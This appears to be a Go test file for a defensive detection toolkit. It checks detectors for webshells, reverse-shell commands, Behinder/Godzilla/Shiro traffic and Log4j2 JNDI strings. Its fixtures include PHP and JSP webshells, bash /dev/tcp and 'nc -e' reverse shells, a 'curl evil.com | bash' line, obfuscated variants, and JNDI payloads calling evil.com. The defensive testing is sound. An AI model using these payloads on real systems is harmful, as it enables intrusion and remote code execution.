package local_test

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"testing"

	"github.com/Martin2877/blue-team-box/engine/local/bash"
	"github.com/Martin2877/blue-team-box/engine/local/btt"
	"github.com/Martin2877/blue-team-box/engine/local/webshell"
)

func TestWebshellJsp(t *testing.T) {
	jsp := `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
<jsp:scriptlet>
Runtime.getRuntime().exec(request.getParameter("i"));
</jsp:scriptlet>
</jsp:root>`
	res := webshell.Check([]byte(jsp))
	if !res.Webshell {
		t.Fatalf("jsp webshell 未检出, score=%d hits=%v", res.Score, res.Hits)
	}
}

func TestWebshellPhp(t *testing.T) {
	php := `<?php @eval($_POST['cmd']); ?>`
	res := webshell.Check([]byte(php))
	if !res.Webshell {
		t.Fatalf("php webshell 未检出, score=%d hits=%v", res.Score, res.Hits)
	}
}

func TestWebshellBase64Encoded(t *testing.T) {
	inner := `<?php @eval($_POST['cmd']); system($_GET['x']); ?>`
	enc := base64.StdEncoding.EncodeToString([]byte(inner))
	res := webshell.Check([]byte(enc))
	if !res.Webshell {
		t.Fatalf("base64 编码 webshell 未检出, score=%d chain=%s", res.Score, res.Chain)
	}
	if res.Chain == "raw" {
		t.Fatalf("应识别出解码链")
	}
}

func TestWebshellClean(t *testing.T) {
	clean := `<html><body><h1>hello world</h1></body></html>`
	res := webshell.Check([]byte(clean))
	if res.Webshell {
		t.Fatalf("误报, score=%d hits=%v", res.Score, res.Hits)
	}
}

func TestBashReverseShell(t *testing.T) {
	cmds := []string{
		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		`nc -e /bin/sh 10.0.0.1 4444`,
		`curl http://evil.com/x.sh | bash`,
		`who$@ami`, // 变量混淆——低分不检出
	}
	res := bash.Check(cmds[0])
	if !res.Found {
		t.Fatalf("反弹shell未检出: %v", res)
	}
	if !bash.Check(cmds[1]).Found {
		t.Fatal("nc -e 未检出")
	}
	if !bash.Check(cmds[2]).Found {
		t.Fatal("curl|sh 未检出")
	}
	if bash.Check(cmds[3]).Found {
		t.Fatal("who$@ami 误报")
	}
}

func TestBashObfuscated(t *testing.T) {
	// base64 混淆的反弹shell
	inner := `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
	b64 := base64.StdEncoding.EncodeToString([]byte(inner))
	res := bash.Check(`echo ` + b64 + ` | base64 -d | bash`)
	if !res.Found {
		t.Fatalf("base64混淆命令未检出: %+v", res)
	}
}

func aesECBEncrypt(data, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	// pkcs7 pad
	pad := aes.BlockSize - len(data)%aes.BlockSize
	for i := 0; i < pad; i++ {
		data = append(data, byte(pad))
	}
	out := make([]byte, len(data))
	for i := 0; i < len(data); i += aes.BlockSize {
		block.Encrypt(out[i:], data[i:])
	}
	return out
}

func TestBehinderC2S(t *testing.T) {
	pass := "rebeyond"
	sum := md5.Sum([]byte(pass))
	key := []byte(hex.EncodeToString(sum[:]))[:16]
	plain := []byte("this is a test payload for behinder c2s")
	ct := aesECBEncrypt(plain, key)
	b64 := base64.StdEncoding.EncodeToString(ct)
	res, err := btt.BehinderDecryptC2S(b64, pass)
	if err != nil {
		t.Fatal(err)
	}
	if res.Output != string(plain) {
		t.Fatalf("解密结果不符: %q", res.Output)
	}
}

func TestShiroCBC(t *testing.T) {
	// 构造一个 Shiro CBC cookie: base64( iv || AES-CBC(serialized) )
	keyB64 := "kPH+bIxk5D2deZiIxcaaaA=="
	key, _ := base64.StdEncoding.DecodeString(keyB64)
	iv := []byte("0123456789abcdef")
	plain := []byte("\xac\xed\x00\x05sr\x00.org.apache.shiro.subject.SimplePrincipalCollection")
	block, _ := aes.NewCipher(key)
	pad := aes.BlockSize - len(plain)%aes.BlockSize
	for i := 0; i < pad; i++ {
		plain = append(plain, byte(pad))
	}
	ct := make([]byte, len(plain))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, plain)
	cookie := base64.StdEncoding.EncodeToString(append(iv, ct...))

	res, err := btt.ShiroCheck(cookie, "", "cbc")
	if err != nil {
		t.Fatal(err)
	}
	if !res.Found || res.Key != keyB64 {
		t.Fatalf("shiro key 未命中: %+v", res)
	}
	fmt.Println("shiro found key:", res.Key)
}

func TestBttSamplesRoundTrip(t *testing.T) {
	s := btt.Samples()

	bh := s["behinder"].(map[string]string)
	if r, err := btt.BehinderDecrypt(bh["data"], bh["pass"], bh["direction"]); err != nil {
		t.Fatalf("冰蝎示例解密失败: %v", err)
	} else {
		fmt.Println("behinder c2s ->", r.Direction, r.Note)
	}

	bs := s["behinder_s2c"].(map[string]string)
	if r, err := btt.BehinderDecrypt(bs["data"], bs["pass"], bs["direction"]); err != nil {
		t.Fatalf("冰蝎 s2c 示例解密失败: %v", err)
	} else {
		fmt.Println("behinder s2c ->", r.Direction, r.Note)
	}

	gz := s["godzilla"].(map[string]string)
	if _, err := btt.GodzillaDecrypt(gz["data"], gz["pass"], gz["key"], gz["enc"]); err != nil {
		t.Fatalf("哥斯拉示例解密失败: %v", err)
	}

	sh := s["shiro"].(map[string]string)
	if r, err := btt.ShiroCheck(sh["rememberMe"], sh["key"], sh["mode"]); err != nil || !r.Found {
		t.Fatalf("shiro 示例未命中: %v %+v", err, r)
	}

	l4 := s["log4j2"].(map[string]string)
	if _, danger := btt.ParseLog4j2(l4["payload"]); !danger {
		t.Fatal("log4j2 示例未检出危险")
	}
}

func TestLog4j2Parse(t *testing.T) {
	lookups, danger := btt.ParseLog4j2("${jndi:ldap://evil.com:1389/a}")
	if !danger || len(lookups) == 0 || lookups[0].Protocol != "ldap" {
		t.Fatalf("jndi 未检出: %+v", lookups)
	}
	// 混淆变体
	lookups2, danger2 := btt.ParseLog4j2("${${lower:J}${upper:NDI}:ldap://evil.com/a}")
	if !danger2 {
		t.Fatalf("混淆 jndi 未检出: %+v", lookups2)
	}
}
